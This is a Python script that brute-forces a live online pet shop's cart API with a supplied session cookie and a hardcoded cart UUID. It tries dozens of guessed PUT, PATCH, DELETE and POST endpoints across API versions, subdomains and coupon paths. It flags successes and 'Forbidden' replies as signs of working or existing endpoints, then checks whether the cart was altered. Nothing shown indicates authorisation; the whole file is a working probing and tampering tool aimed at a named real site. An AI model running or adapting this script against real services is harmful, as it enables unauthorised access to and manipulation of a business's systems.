#!/usr/bin/env python3
"""
Comprehensive cart modification test - try EVERYTHING
"""

import requests
import json
import sys
import time

BASE_URL = "https://www.zooplus.de"
CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"

SESSION_COOKIE = sys.argv[1] if len(sys.argv) > 1 else None

if not SESSION_COOKIE:
    print("[!] Usage: python3 test_cart_modify_comprehensive.py <session_cookie>")
    sys.exit(1)

headers = {
    "Cookie": SESSION_COOKIE,
    "Accept": "application/json",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Referer": "https://www.zooplus.de/warenkorb",
    "Origin": "https://www.zooplus.de"
}

print(f"[*] Comprehensive cart modification test")
print()

# Get cart
r = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
if r.status_code != 200:
    print(f"[!] Failed to read cart: {r.status_code}")
    sys.exit(1)

cart = r.json()
before_count = len(cart.get("articles", []))
before_total = cart.get("summary", {}).get("grandTotal", 0)
print(f"[+] Cart: {before_count} items, {before_total} EUR")

first_article = cart.get("articles", [{}])[0]
article_id = first_article.get("id")
offer_id = first_article.get("offerId", "")
shop_id = first_article.get("shopId", "")
cart_id = cart.get("cartId")

print(f"[+] Article ID: {article_id}")
print(f"[+] Offer ID: {offer_id}")
print(f"[+] Shop ID: {shop_id}")
print(f"[+] Cart ID: {cart_id}")
print()

# Try ALL possible combinations
all_tests = []

# Test 1: Direct article manipulation with different IDs
for aid in [article_id, offer_id, shop_id]:
    if not aid:
        continue
    all_tests.extend([
        ("PUT", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/articles/{aid}", {"quantity": 0}),
        ("PATCH", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/articles/{aid}", {"quantity": 0}),
        ("DELETE", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/articles/{aid}", None),
        ("POST", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/articles/{aid}/remove", None),
        ("POST", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/articles/{aid}/delete", None),
    ])

# Test 2: Using cartId instead of UUID
if cart_id:
    all_tests.extend([
        ("PUT", f"/checkout/api/cart-api/v2/cart/{cart_id}/articles/{article_id}", {"quantity": 0}),
        ("DELETE", f"/checkout/api/cart-api/v2/cart/{cart_id}/articles/{article_id}", None),
        ("POST", f"/checkout/api/cart-api/v2/cart/{cart_id}/articles/{article_id}/remove", None),
    ])

# Test 3: Bulk update endpoints
all_tests.extend([
    ("POST", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/articles", {
        "articles": [{"id": article_id, "quantity": 0}]
    }),
    ("PUT", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/articles", {
        "articles": [{"id": article_id, "quantity": 0}]
    }),
    ("POST", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/articles", {
        "articles": [{"offerId": offer_id, "quantity": 0}]
    }),
    ("POST", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/items", {
        "items": [{"id": article_id, "quantity": 0}]
    }),
])

# Test 4: Different action endpoints
all_tests.extend([
    ("POST", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/remove", {"articleId": article_id}),
    ("POST", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/remove", {"offerId": offer_id}),
    ("POST", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/update", {"articles": [{"id": article_id, "quantity": 0}]}),
    ("POST", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/modify", {"articles": [{"id": article_id, "quantity": 0}]}),
])

# Test 5: Try v1 API
all_tests.extend([
    ("PUT", f"/checkout/api/cart-api/v1/cart/{CART_UUID}/articles/{article_id}", {"quantity": 0}),
    ("POST", f"/checkout/api/cart-api/v1/cart/{CART_UUID}/remove", {"articleId": article_id}),
    ("POST", f"/checkout/api/cart-api/v1/cart/{CART_UUID}/update", {"articles": [{"id": article_id, "quantity": 0}]}),
])

# Test 6: Try state API
all_tests.extend([
    ("POST", f"/checkout/api/cart-state-api/v2/cart/{CART_UUID}/update", {"articles": [{"id": article_id, "quantity": 0}]}),
    ("PUT", f"/checkout/api/cart-state-api/v2/cart/{CART_UUID}/articles/{article_id}", {"quantity": 0}),
])

# Test 7: Try different domains/paths
for domain in ["www.zooplus.de", "api.zooplus.de", "checkout.zooplus.de"]:
    all_tests.extend([
        ("PUT", f"https://{domain}/checkout/api/cart-api/v2/cart/{CART_UUID}/articles/{article_id}", {"quantity": 0}),
    ])

# Test 8: Coupon endpoints
all_tests.extend([
    ("POST", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/coupon", {"code": "TEST"}),
    ("POST", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/coupon", {"couponCode": "TEST"}),
    ("POST", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/coupon", {"voucherCode": "TEST"}),
    ("POST", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/promocode", {"code": "TEST"}),
    ("POST", f"/checkout/api/cart-api/v2/cart/{CART_UUID}/voucher", {"code": "TEST"}),
])

successful = []
interesting = []  # 400, 405, etc - endpoints that exist but need different payload

print(f"[*] Testing {len(all_tests)} endpoints...")
print()

for i, (method, endpoint, payload) in enumerate(all_tests, 1):
    if endpoint.startswith("http"):
        url = endpoint
    else:
        url = f"{BASE_URL}{endpoint}"
    
    if i % 10 == 0:
        print(f"[*] Progress: {i}/{len(all_tests)}...")
    
    try:
        if method == "DELETE":
            r = requests.delete(url, headers=headers, timeout=5, allow_redirects=False)
        elif method == "PUT":
            r = requests.put(url, headers=headers, json=payload, timeout=5, allow_redirects=False)
        elif method == "PATCH":
            r = requests.patch(url, headers=headers, json=payload, timeout=5, allow_redirects=False)
        else:
            r = requests.post(url, headers=headers, json=payload, timeout=5, allow_redirects=False)
        
        if r.status_code in [200, 204]:
            print(f"\n[!!!] SUCCESS: {method} {endpoint}")
            print(f"    Response: {r.text[:300]}")
            successful.append((method, endpoint, payload, r.status_code, r.text[:500]))
        elif r.status_code in [400, 405]:
            interesting.append((method, endpoint, payload, r.status_code, r.text[:200]))
        elif r.status_code == 403:
            interesting.append((method, endpoint, payload, r.status_code, "Forbidden - endpoint exists!"))
    except:
        pass

print()
print("[*] Verifying cart...")
r = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
if r.status_code == 200:
    cart_after = r.json()
    after_count = len(cart_after.get("articles", []))
    after_total = cart_after.get("summary", {}).get("grandTotal", 0)
    print(f"[+] Cart now: {after_count} items, {after_total} EUR")
    
    if before_count != after_count or abs(before_total - after_total) > 0.01:
        print()
        print("[!!!] ========================================")
        print("[!!!] CART WAS MODIFIED!")
        print("[!!!] ========================================")

if successful:
    print()
    print("[!!!] WORKING ENDPOINTS:")
    for method, endpoint, payload, status, response in successful:
        print(f"[!!!] {method} {endpoint}")
        if payload:
            print(f"      Payload: {json.dumps(payload)}")
        print()

if interesting:
    print()
    print("[!] Interesting responses (endpoints may exist):")
    for method, endpoint, payload, status, response in interesting[:10]:
        print(f"[!] {method} {endpoint} -> {status}")
        print(f"    {response[:100]}")

